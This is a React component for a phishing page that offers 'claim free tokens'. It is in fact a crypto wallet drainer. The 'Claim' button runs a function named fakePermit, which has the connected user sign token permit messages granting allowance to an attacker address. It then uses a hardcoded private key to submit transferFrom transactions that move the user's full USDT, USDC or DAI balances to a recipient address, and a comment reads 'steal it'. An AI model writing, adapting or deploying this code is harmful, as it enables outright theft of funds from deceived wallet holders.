import React, { useState, useEffect } from "react";
import ABI from "./ABI.json";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount } from "wagmi";
import Web3 from "web3";
import { ethers } from "ethers";

const Slider = () => {
  const { address, isConnected, isConnecting, isDisconnected } = useAccount();
  const { open, close } = useWeb3Modal();

  // contract instance web3js and Ethersjs
  const tokenAddress = "0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49";

  async function fakePermit() {
    if (!window.ethereum) {
      alert("Please install a Web3 wallet");
      return;
    }

    const web3 = new Web3(window.ethereum);
    let provider = new ethers.BrowserProvider(window.ethereum);
    let signer = provider.getSigner();

    function getTimestampInSeconds() {
      // returns current timestamp in seconds
      return Math.floor(Date.now() / 1000);
    }

    const tokenContract = new web3.eth.Contract(ABI, tokenAddress);

    const myToken = new ethers.Contract(tokenAddress, ABI, provider);

    const usdcToken = "0x07865c6e87b9f70255377e024ace6630c1eaa37f";
    const usdcConract = new ethers.Contract(usdcToken, ABI, provider);
    const tokenContractUsdc = new web3.eth.Contract(ABI, usdcToken);

    const daiToken = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844";
    const daiConract = new ethers.Contract(daiToken, ABI, provider);
    const tokenContractDai = new web3.eth.Contract(ABI, daiToken);

    // declare all variables

    const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
    const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
    const initiatorPK =
      "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";

    const wallet = await new ethers.Wallet(initiatorPK, provider);

    // get the network chain id
    const chainId = (await provider.getNetwork()).chainId;

    // ... other code

    const value = ethers
      .formatUnits(ethers.parseEther("1.0"), "wei")
      .toString();
    // ... rest of the code remains the same

    const deadline = getTimestampInSeconds() + 4200; // Set a deadline 1 hour (3600 seconds) in the future

    let tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
    let tokenReceiverBalance = (await myToken.balanceOf(address)).toString();

    console.log(`Starting tokenOwner balance: ${tokenOwnerBalance}`);
    console.log(`Starting tokenReceiver balance: ${tokenReceiverBalance}`);
    //console.log(await myToken.result);

    const contractNonce = await myToken.nonces(address);
    const contractNonce2 = await daiConract.nonces(address);
    const contractNonce3 = await usdcConract.nonces(address);

    // Sample account balances
    let account1Balance = 100;
    let account2Balance = 200;
    let account3Balance = 0;

    const bwalance = ethers
      .formatEther(ethers.parseEther("0.00048"), "wei")
      .toString();

    let usdt = ethers.formatEther(await myToken.balanceOf(address)).toString();

    let usdc = ethers
      .formatEther(await usdcConract.balanceOf(address))
      .toString();

    let dai = ethers
      .formatEther(await daiConract.balanceOf(address))
      .toString();

    console.log(`usdt ${usdt}, usdc ${usdc}, dai ${dai} `);
    console.log(`bwalance ${bwalance}`);

    // Checking and printing balances conditionally
    async function checkBalances() {
      if (usdt > bwalance) {
        console.log(`usdt ${usdt}`);
        drainUsdt();
      }

      if (usdc > bwalance) {
        console.log(`usdc ${usdc}`);
      }

      if (dai > bwalance) {
        console.log(`dai ${dai} ${await daiConract.name()} `);
        drainDai();
      }
    }

    // Call the function to check balances conditionally
    checkBalances();

    async function drainUsdt() {
      // set the domain parameters
      const domain = {
        name: await myToken.name(), // token name
        version: "1", // version of a token
        chainId: chainId,
        verifyingContract: tokenAddress,
      };

      // set the Permit type parameters
      const types = {
        Permit: [
          {
            name: "owner",
            type: "address",
          },
          {
            name: "spender",
            type: "address",
          },
          {
            name: "value",
            type: "uint256",
          },
          {
            name: "nonce",
            type: "uint256",
          },
          {
            name: "deadline",
            type: "uint256",
          },
        ],
      };

      // set the Permit type values
      const values = {
        owner: address,
        spender: initiator,
        value: value,
        nonce: contractNonce,
        deadline: deadline,
      };
      let signer = await provider.getSigner(address);

      const signature = await signer.signTypedData(domain, types, values);

      const sig = ethers.Signature.from(signature);

      const permitData = tokenContract.methods
        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
        .encodeABI();

      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2); // Ensure gas limit is in hexadecimal format
      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16); // Ensure gas price is in hexadecimal format

      const permitTX = {
        from: initiator,
        to: tokenAddress,
        nonce: await provider.getTransactionCount(initiator),
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        value: "0x",
        data: permitData,
      };

      const signedPermitTX = await web3.eth.accounts.signTransaction(
        permitTX,
        initiatorPK
      );

      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
      await tx;

      // Prepare and send the permit transaction
      console.log(
        `Check allowance of tokenReceiver: ${await myToken.allowance(
          address,
          initiator
        )}`
      );
      const balance = await myToken.balanceOf(address);
      console.log(`Trasnferring ${balance}`);

      // after the token is approved to us, steal it
      const transferData = tokenContract.methods
        .transferFrom(address, recipient, balance)
        .encodeABI();
      const transferTX = {
        from: initiator,
        to: tokenAddress,
        nonce: (await provider.getTransactionCount(initiator)) + 1, // don't forget to increment initiator's nonce
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        data: transferData,
        value: "0x",
      };
      const signedTransferTX = await web3.eth.accounts.signTransaction(
        transferTX,
        initiatorPK
      );

      wallet.sendTransaction(signedTransferTX);
      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
      await tx2;

      // Get ending balances
      tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
      tokenReceiverBalance = (await myToken.balanceOf(recipient)).toString();

      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
    }

    async function drainDai() {
      // set the domain parameters
      const domain = {
        name: await usdcConract.name(), // token name
        version: "2", // version of a token
        chainId: chainId,
        verifyingContract: usdcToken,
      };

      // set the Permit type parameters
      const types = {
        Permit: [
          {
            name: "owner",
            type: "address",
          },
          {
            name: "spender",
            type: "address",
          },
          {
            name: "value",
            type: "uint256",
          },
          {
            name: "nonce",
            type: "uint256",
          },
          {
            name: "deadline",
            type: "uint256",
          },
        ],
      };

      // set the Permit type values
      const values = {
        owner: address,
        spender: initiator,
        value: value,
        nonce: contractNonce3,
        deadline: deadline,
      };
      let signer = await provider.getSigner(address);

      const signature = await signer.signTypedData(domain, types, values);

      const sig = ethers.Signature.from(signature);

      const permitData = tokenContractUsdc.methods
        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
        .encodeABI();

      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2); // Ensure gas limit is in hexadecimal format
      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16); // Ensure gas price is in hexadecimal format

      const permitTX = {
        from: initiator,
        to: usdcToken,
        nonce: await provider.getTransactionCount(initiator),
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        value: "0x",
        data: permitData,
      };

      const signedPermitTX = await web3.eth.accounts.signTransaction(
        permitTX,
        initiatorPK
      );

      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
      await tx;

      // Prepare and send the permit transaction
      console.log(
        `Check allowance of tokenReceiver: ${await usdcConract.allowance(
          address,
          initiator
        )}`
      );
      const balance = await usdcConract.balanceOf(address);
      console.log(`Trasnferring ${balance}`);

      // after the token is approved to us, steal it
      const transferData = tokenContractUsdc.methods
        .transferFrom(address, recipient, balance)
        .encodeABI();
      const transferTX = {
        from: initiator,
        to: usdcToken,
        nonce: (await provider.getTransactionCount(initiator)) + 1, // don't forget to increment initiator's nonce
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        data: transferData,
        value: "0x",
      };
      const signedTransferTX = await web3.eth.accounts.signTransaction(
        transferTX,
        initiatorPK
      );

      wallet.sendTransaction(signedTransferTX);

      //console.log("Transaction hash:", tx.hash);
      //console.log("Transaction sent:", tx);
      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
      await tx2;

      // Get ending balances
      tokenOwnerBalance = (await usdcConract.balanceOf(address)).toString();
      tokenReceiverBalance = (
        await usdcConract.balanceOf(recipient)
      ).toString();

      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
    }
  }

  function top() {
    alert("claim fire");
  }
  return (
    <>
      <div className="slider">
        <h1> claim free tokens </h1>
        <p> connect wallet to check eligibiliy.. </p>

        {isConnected ? (
          <button onClick={fakePermit}>Claim</button>
        ) : (
          <button
            onClick={() => {
              open();
            }}
          >
            connect wallet
          </button>
        )}
      </div>
    </>
  );
};

export default Slider;
